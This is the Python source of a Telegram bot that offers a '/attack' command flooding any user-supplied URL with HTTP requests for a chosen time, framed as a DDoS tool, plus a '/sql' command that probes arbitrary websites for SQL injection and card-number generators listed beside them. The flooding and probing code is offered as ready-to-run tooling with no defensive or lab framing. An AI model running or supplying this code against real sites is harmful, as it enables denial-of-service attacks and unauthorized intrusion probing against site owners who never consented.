import os,requests,threading,time,random,json
from telebot import *

BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
bot = TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start','help'])
def send_welcome(message):
    owner = types.InlineKeyboardButton(text="Owner",url="https://t.me/ItzMeSahid")
    markup = types.InlineKeyboardMarkup().add(owner)
    bot.reply_to(message,"Welcome to simple bot 🤡\n\n--------------------------------------------------\nDDoS:\n\t/attack <URL> <TIME>\n\n--------------------------------------------------\nLove Calculator:\n\t/love <NAME1> <NAME2>\n\n--------------------------------------------------\nCC Generator:\n\t/visa for Visa Card\n\t/mc for Mastercard\n\t/disc for Discover\n\t/amex for AmericanExpress\n\n--------------------------------------------------\nSQLI Checker:\n\t/sql <URL>\n\n-------------------------------------------------",reply_markup=markup)
    
    
@bot.message_handler(commands=["attack"])
def Ddos(message):
    user_text = message.text.split()
    if len(user_text)==3:
        url=user_text[1]
        if not url.startswith("https" or "http"):
            url=f"https://{url}"
        else:
            pass
        t = int(user_text[2])
        t1 = t+time.time()
        bot.reply_to(message,f"Attack Send Successfully✅\nURL:{url}\nTIME:{t} SECONDS")
        print(f"Attack Sended: [{url}]")
        while True:
            if t1>time.time():
                response = requests.get(url)
            else:
                break
    else:
            bot.reply_to(message,f"Uses:\n/attack <URL> <TIME>")
            
            
def launch_attack(message):
    for _ in range(10000):
        threading.Thread(target=Ddos, args=(message,)).start()
        
@bot.message_handler(commands=["love"])
def love(message):
    user_text=message.text.split()
    if len(user_text)==3:
        n=user_text[1]
        n2=user_text[2]
        l = random.randint(0,100)
        bot.reply_to(message,f"Love Between:\n{n.title()} + {n2.title()} = {l}% 🤡")
    else:
        bot.reply_to(message,f"Uses:\n\t\t/love <NAME1> <NAME2>")


@bot.message_handler(commands=["sql","SQL"])
def sql(message):
    user_text=message.text.split()
    if len(user_text)==2:
        url=user_text[1]
        if not url.startswith("https" or "http"):
            url=f"https://{url}"
        else:
            pass
        checkurl=url+"%27"
        response = requests.get(url)
        response1 = requests.get(checkurl)
        if(response.text != response1.text):
            bot.reply_to(message,f"Website is Vulnerable to SQLI✅\n\tURL:{url}")
        else:
            bot.reply_to(message,f"Website is not Vulnerable to SQLI❌/n/tURL:{url}")
    else:
        bot.reply_to(message,f"Uses:\n\t/sql <URL>")
        
                        
        
@bot.message_handler(commands=['visa'])
def visa(message):
     data = {
     'Type': 'visa',
     'X-Requested-With': 'XMLHttpRequest',}
     url = requests.post('https://randommer.io/Card', data=data)
     data = json.loads(url.content)
     card = data['cardNumber']
     name = data['fullName']
     cvv = data['cvv']
     pin = data['pin']
     type = data['type']
     date = data['date']
     text =f'Card Number: {card}\nFull Name: {name}\nCVV: {cvv}\nType: {type}\nPin: {pin}\nExpiration Date: {date}\n \nOwner: @ItzMeSahid'
     bot.reply_to(message,text)

@bot.message_handler(commands=['mc'])
def visa(message):
     data = {
     'Type': 'mastercard',
     'X-Requested-With': 'XMLHttpRequest',}
     url = requests.post('https://randommer.io/Card', data=data)
     data = json.loads(url.content)
     card = data['cardNumber']
     name = data['fullName']
     cvv = data['cvv']
     pin = data['pin']
     type = data['type']
     date = data['date']
     text =f'Card Number: {card}\nFull Name: {name}\nCVV: {cvv}\nType: {type}\nPin: {pin}\nExpiration Date: {date}\n \nOwner: @ItzMeSahid'
     bot.reply_to(message,text)
     
	    
@bot.message_handler(commands=['amex'])
def visa(message):
     data = {
     'Type': 'americanexpress',
     'X-Requested-With': 'XMLHttpRequest',}
     url = requests.post('https://randommer.io/Card', data=data)
     data = json.loads(url.content)
     card = data['cardNumber']
     name = data['fullName']
     cvv = data['cvv']
     pin = data['pin']
     type = data['type']
     date = data['date']
     text =f'Card Number: {card}\nFull Name: {name}\nCVV: {cvv}\nType: {type}\nPin: {pin}\nExpiration Date: {date}\n \nOwner: @ItzMeSahid'
     bot.reply_to(message,text)
     
     
@bot.message_handler(commands=['disc'])
def visa(message):
     data = {
     'Type': 'discover',
     'X-Requested-With': 'XMLHttpRequest',}
     url = requests.post('https://randommer.io/Card', data=data)
     data = json.loads(url.content)
     card = data['cardNumber']
     name = data['fullName']
     cvv = data['cvv']
     pin = data['pin']
     type = data['type']
     date = data['date']
     text =f'Card Number: {card}\nFull Name: {name}\nCVV: {cvv}\nType: {type}\nPin: {pin}\nExpiration Date: {date}\n \nOwner: @ItzMeSahid'
     bot.reply_to(message,text)
                             
    
bot.infinity_polling()



